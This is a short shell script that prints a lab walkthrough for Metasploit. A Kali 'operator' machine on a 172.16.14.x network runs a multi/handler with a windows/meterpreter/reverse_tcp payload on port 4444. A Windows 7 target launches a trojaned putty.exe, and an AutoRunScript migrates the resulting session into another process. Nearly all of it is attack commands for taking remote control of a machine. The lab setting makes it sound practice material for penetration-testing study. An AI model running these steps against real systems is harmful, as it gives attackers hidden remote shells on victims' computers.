echo '
--] ADD OPTION TO METASPLOIT 40

OPERATOR   === KALI               IP === 132
TANGO      === WIN 7              IP === 134
LAB        === NET                ALL === 172.16.14.IP


OPERATOR    ==> TASK ==> sudo su << for to be root

OPERATOR    ==> TASK ==> msfconsole -q
OPERATOR    ==> TASK ==> use exploit/multi/handler
OPERATOR    ==> TASK ==> set payload windows/meterpreter/reverse_tcp
OPERATOR    ==> TASK ==> set lhost IP_OPERATOR
OPERATOR    ==> TASK ==> set lport 4444
OPERATOR    ==> TASK ==> exploit -j
TANGO       ==> TASK ==> run putty.exe
OPERATOR    ==> TASK ==> session -i 
OPERATOR    ==> TASK ==> touch CommandsOnExecute.rc
OPERATOR    ==> TASK ==> echo run post/windows/manage/migrate > CommandsOnExecute.rc

OPERATOR    ==> TASK ==> show advanced
OPERATOR    ==> TASK ==> set AutoRunScript /home/kali/CommandsOnExecute.rc
OPERATOR    ==> TASK ==> exploit -j
OPERATOR    ==> TASK ==> session -i
OPERATOR    ==> TASK ==> session -i 2


'
read